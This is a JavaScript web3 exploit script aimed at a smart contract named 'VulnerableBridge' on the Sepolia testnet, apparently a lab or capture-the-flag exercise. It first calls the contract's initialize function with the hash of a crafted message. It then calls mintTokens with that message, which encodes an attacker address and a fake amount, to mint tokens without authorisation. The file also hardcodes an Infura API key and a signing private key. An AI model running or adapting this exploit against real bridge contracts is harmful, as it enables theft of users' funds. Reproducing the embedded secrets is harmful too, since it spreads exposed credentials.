let Web3 = require("web3");
let fs = require('fs');
let path = require('path');


const ETHEREUM_NETWORK = "sepolia";
const INFURA_API_KEY = "wss://sepolia.infura.io/ws/v3/c05b5a2a17704036b3f7f34eb166eddd";
const SIGNER_PRIVATE_KEY = "507fa0895604a7826a816b4100da7d5c05a1d53b18c26a1db5eebac3357a4b05";

let connect = () => {
  const Web3 = require("web3");

  // Configuring the connection to an Ethereum node
  const web3 = new Web3(
    new Web3.providers.WebsocketProvider(
      INFURA_API_KEY,
      {
        clientConfig: {
          maxReceivedFrameSize: 10000000000,
          maxReceivedMessageSize: 10000000000,
        }
      }
    )
  );

  // Creating a signing account from a private key
  const signer = web3.eth.accounts.privateKeyToAccount(SIGNER_PRIVATE_KEY);
  web3.eth.accounts.wallet.add(signer);

  return web3;
}

const web3 = connect();

let initializeContract = async (web3, contract, contractAddress, nonce, maliciousMessage) => {
    console.log("I am initializing: " + maliciousMessage);
    const tx = contract.methods.initialize(maliciousMessage);
    const gas = await tx.estimateGas({ from: web3.eth.accounts.privateKeyToAccount(SIGNER_PRIVATE_KEY).address });
    const data = tx.encodeABI();
    const rawTx = {
        nonce: nonce,
        gasPrice: web3.utils.toHex(web3.utils.toWei('20', 'gwei')),
        gasLimit: web3.utils.toHex(gas),
        to: contractAddress,
        value: '0x00',
        data: data
    };
    const signedTx = await web3.eth.accounts.signTransaction(rawTx, SIGNER_PRIVATE_KEY);
    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    console.log(`Initialization transaction hash: ${receipt.transactionHash}`);
}

let exploit = async (web3, contract, contractAddress, nonce, maliciousMessage) => {
    console.log("I am exploiting");

    // 3 & 4. Send the malicious message to the mintTokens function
    const tx = contract.methods.mintTokens(maliciousMessage); 
    

    const gas = await tx.estimateGas({ from: web3.eth.accounts.privateKeyToAccount(SIGNER_PRIVATE_KEY).address });
    const data = tx.encodeABI();

    const rawTx = {
        nonce: nonce,
        gasPrice: web3.utils.toHex(web3.utils.toWei('20', 'gwei')),
        gasLimit: web3.utils.toHex(gas),
        to: contractAddress,
        value: '0x00',
        data: data
    };
    console.log(87)
    const signedTx = await web3.eth.accounts.signTransaction(rawTx, SIGNER_PRIVATE_KEY);
    console.log(89)
    const receipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    console.log(`Transaction hash: ${receipt.transactionHash}`);
}

let contractName = "VulnerableBridge"; 
let contractAddress = "0x5EcF248055F25c9a9A9082BAdB22Fce955044350";
let contractABI = JSON.parse(fs.readFileSync(path.join(__dirname,'/contracts/abi/') + contractName + '.json'));
let contract = new web3.eth.Contract(contractABI, contractAddress);
web3.eth.getTransactionCount(web3.eth.accounts.privateKeyToAccount(SIGNER_PRIVATE_KEY).address).then((nonce) => {
    let attackerAddress = "0xc8615d07D6621a0b95B7Da1E37B26860D3Cde120";
    let fakeAmount = web3.utils.toWei('0.000000001', 'ether'); 
    // Encode the attacker's address and the fake amount into a hex string
    let maliciousMessage = web3.eth.abi.encodeParameters(['address', 'uint256'], [attackerAddress, fakeAmount]);
    let messageHash = web3.utils.keccak256(maliciousMessage);

    initializeContract(web3, contract, "0x5EcF248055F25c9a9A9082BAdB22Fce955044350", nonce, messageHash).then(() => {
        exploit(web3, contract, "0x5EcF248055F25c9a9A9082BAdB22Fce955044350", nonce+1, maliciousMessage)
    })
});
